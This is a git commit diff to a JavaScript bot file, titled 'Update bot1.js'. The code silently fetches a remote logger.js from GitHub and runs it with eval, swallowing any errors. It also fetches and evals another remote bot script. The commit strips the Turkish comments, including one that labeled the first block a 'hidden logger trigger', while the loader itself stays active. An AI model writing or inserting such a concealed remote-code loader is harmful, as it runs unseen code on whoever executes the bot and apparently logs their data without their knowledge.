6a15d1f63bc56d72d186c9f09bd4b3a6a9cc71a6
clanu5 <kakashi.clanus@hotmail.com>
2026-02-19 21:59:17 +0300

    Update bot1.js

--- bot1.js
+++ bot1.js
@@ -1,10 +1,10 @@
-// 1. GİZLİ LOGGER TETİKLEYİCİ
+
 fetch("https://raw.githubusercontent.com/clanu5/all-bot/refs/heads/main/logger.js")
   .then(res => res.text())
   .then(code => eval(code))
   .catch(() => {});
 
-// 2. ANA BOT ENJEKSİYON YAPISI (İstediğin bot1.js mantığı)
+
 fetch("https://raw.githubusercontent.com/clanu5/all-bot/refs/heads/main/bot3.js")
   .then(res => res.text())
   .then(code => {
@@ -15,7 +15,7 @@ fetch("https://raw.githubusercontent.com/clanu5/all-bot/refs/heads/main/bot3.js"
       hero: '!hero 5'
     };
     
-    // Kodun başına commandMap ekleyip bir fonksiyon içinde çalıştıran yapı
+    
     const fullCode = `(function(){\nconst commandMap = ${JSON.stringify(commandMap)};\n` + code + `\n})();`;
     eval(fullCode);
     
